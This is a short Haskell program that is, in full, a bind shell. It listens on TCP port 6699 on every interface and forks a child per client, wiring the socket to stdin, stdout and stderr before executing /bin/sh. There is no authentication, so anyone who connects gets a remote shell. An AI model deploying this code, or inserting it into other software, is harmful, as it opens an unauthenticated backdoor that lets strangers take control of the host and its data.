module Main where

import System.IO
import Network.Socket
import System.Posix.Process (forkProcess, executeFile)
import System.Posix.IO (handleToFd, dupTo, stdInput, stdOutput, stdError)

main :: IO ()
main = do
	putStrLn "Starting"
	srvSock <- socket AF_INET Stream 0
	setSocketOption srvSock ReuseAddr 1
	bind srvSock (SockAddrInet 6699 iNADDR_ANY)
	listen srvSock 1
	sockLoop srvSock

sockLoop :: Socket -> IO ()
sockLoop srvSock = do
	(remoteSock, remoteAddr) <- accept srvSock
	putStrLn $ "client connected: " ++ show remoteAddr
	hdl <- socketToHandle remoteSock ReadWriteMode
	handleClient hdl
	sockLoop srvSock

handleClient :: Handle -> IO ()
handleClient hdl = do
	pid <- forkProcess (doChild hdl)
	putStrLn $ "forked pid: " ++ show pid
	hClose hdl

doChild :: Handle -> IO ()
doChild hdl = do
	hPutStrLn hdl "Hello World\n"
	sockFd <- handleToFd hdl
	dupTo sockFd stdInput
	dupTo sockFd stdOutput
	dupTo sockFd stdError
	executeFile "/bin/sh" False [] Nothing
	putStrLn "unreachable"
	

